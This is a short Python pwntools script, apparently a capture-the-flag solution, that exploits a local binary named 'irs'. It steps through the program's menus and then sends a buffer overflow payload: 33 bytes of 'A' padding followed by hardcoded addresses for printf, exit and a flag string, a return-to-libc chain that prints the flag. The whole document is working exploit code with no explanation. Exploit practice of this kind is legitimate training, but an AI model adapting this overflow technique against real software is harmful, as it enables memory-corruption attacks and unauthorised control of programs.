#!/usr/bin/env python

from pwn import *


exit = p32(0xf7e199b0)
puts = p32(0x0804afdc)
flag = p32(0x0804c03a)

printf = p32(0xf7e34590)

p = tubes.process.process('./irs') 

initial_offset = 33

#'''
print p.recv()
p.sendline("1")
print p.recv()
p.sendline("john")
print p.recv()
p.sendline("wins")
print p.recv()
p.sendline("1")
print p.recv()
p.sendline("1")
print p.recv()
p.sendline("3")
print p.recv()
p.sendline("john")
print p.recv()
p.sendline("wins")
print p.recv()
p.sendline('A'*(initial_offset) + printf + exit + flag)
print p.recv()
print p.recv()

#'''

p.close()